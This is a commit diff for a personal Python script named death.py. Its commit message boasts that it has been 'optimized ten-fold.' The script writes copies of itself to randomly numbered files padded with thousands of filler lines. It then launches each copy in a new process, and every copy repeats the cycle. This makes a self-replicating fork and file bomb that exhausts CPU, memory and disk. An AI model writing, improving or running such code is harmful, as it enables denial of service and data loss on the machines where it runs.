Basically fixing everything, death script has been optimized ten-fold.

+++ personal/death.py
@@ -1,39 +1,69 @@
 import random as r
 import subprocess as s
+import multiprocessing as mp
 import os
 
-adkjghkudhgkuydhilbzfsiubgfdzldg
-
-randoNum = 100000
-name = os.path.splitext(os.path.basename(__file__))
-name = name[0]
+randoNum = 1
+name = os.path.splitext(os.path.basename(__file__))[0]
 
 contents = f'''
 import {name} as m
 import random as r
 import subprocess as s
+import multiprocessing as mp
+import os
 
-for a in range(100):
-  i = r.randint(0, {randoNum})
-  m.writeFile(f"{{i}}.py", m.contents)
-  filename = "python " + str(i) + ".py"
-  s.Popen(filename, shell=False)
-  print(f"Created {{i}}.py!")
 
-'''  # + "\'\'\'𪚥 \'\'\'\n"*100000
+def runFile(i):
+    filename = "python " + str(i) + ".py"
+    s.Popen(filename, shell=False)
+
+
+def handleFile(i):
+    file = os.getcwd() + "\\\\" + str(i) + ".py"
+    if not os.path.isfile(file):
+        m.writeFile(f"{{i}}.py", m.contents)
+    runFile(i)
+    print(f"Created {{i}}.py!")
+
+
+def main():
+    for a in range(10):
+        i = r.randint(0, 10)
+        if __name__ == "__main__":
+            mp.Process(target=handleFile, args=(i,)).start()
+
+
+main()
+''' + "##################################################\n" * 10000
 
 
 def writeFile(fileName, contents):
-	fileContents = ""
-	with open(fileName, 'w') as openFile:
-		for i in contents:
-			openFile.write(str(i))
-			fileContents += str(i)
+    fileContents = ""
+    with open(fileName, 'w') as openFile:
+        for i in contents:
+            openFile.write(str(i))
+            fileContents += str(i)
 
 
-for a in range(100):
-	i = r.randint(0, randoNum)
-	writeFile(f"{i}.py", contents)
-	filename = "python " + str(i) + ".py"
-	s.Popen(filename, shell=False)
-	print(f"Created {i}.py!")
+def runFile(i):
+    filename = "python " + str(i) + ".py"
+    s.Popen(filename, shell=False)
+
+
+def handleFile(i):
+    file = os.getcwd() + "\\" + str(i) + ".py"
+    if not os.path.isfile(file):
+        writeFile(f"{i}.py", contents)
+    runFile(i)
+    print(f"Created {i}.py!")
+
+
+def main():
+    for a in range(1):
+        i = r.randint(0, randoNum)
+        mp.Process(target=handleFile, args=(i,)).start()
+
+
+if __name__ == "__main__":
+    main()
